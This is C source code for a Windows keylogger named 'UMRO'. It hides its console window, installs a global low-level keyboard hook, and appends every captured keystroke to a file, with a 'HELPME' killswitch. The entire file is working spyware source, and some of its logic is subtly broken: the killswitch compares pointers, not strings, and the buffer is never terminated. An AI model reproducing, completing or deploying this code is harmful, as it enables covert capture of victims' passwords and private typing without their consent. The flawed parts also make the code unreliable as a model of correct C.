#include <stdio.h>
#include "debug.h"
#define _WIN32_WINNT 0x0500
#include <windows.h>
#include "functions.h"

#define BUFFER_LENGTH 20

char buffer[BUFFER_LENGTH];
int curBuf = 0;

const char *KILLSWITCH = "HELPME";
const char *PATH = "PATH_TO_FILE";

int main() {

#ifndef DEBUG
    HideWindow();
#endif

    DebugPrint("Starting UMRO..");

    //Retrieve the applications instance
    HINSTANCE instance = GetModuleHandle(NULL);
    //Set a global Windows Hook to capture keystrokes using the function declared above
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, instance, 0);

    if (hook == NULL) {
        DebugPrint("Failed to hook. Exiting..");
        return -1;
    }

    DebugPrint("Hook successful.");

    // Wait indefinitely
    while (GetMessage(0, 0, 0, 0)) {

    }

    getchar();

    UnhookWindowsHookEx(hook);
    return 0;
}

void HideWindow() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_MINIMIZE);
    ShowWindow(hWnd, SW_HIDE);
}

void DebugPrint(char *message) {
#ifdef DEBUG
    printf(message);
    printf("\n");
#endif
}

//The function that implements the key logging functionality
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    char pressedKey;
    KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *) lParam;

    switch (wParam) {
        // When the key has been pressed and released
        case WM_KEYUP: {
            pressedKey = (char) pKeyBoard->vkCode;
        }
            break;
        default:
            return CallNextHookEx(NULL, nCode, wParam, lParam);
    }

    int ksLength = strlen(KILLSWITCH);
    char *last = &buffer[strlen(buffer) - ksLength];

    if (last == KILLSWITCH) {
        // Killswitch
        DebugPrint("Killswitch entered. Exiting..");
        exit(0);
    }

    // Append to file after BUFFER_LENGTH characters
    if (curBuf == BUFFER_LENGTH - 1) {

        FILE *out = fopen(PATH, "a+");
        int results = fputs(buffer, out);
        if (results == EOF) {
            // Failed to write
            DebugPrint("Failed to write to file.");
        }
        else{
            DebugPrint("Wrote to file.");
        }

        fclose(out);
        curBuf = 0;
    }

    buffer[curBuf] = pressedKey;
    curBuf++;

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}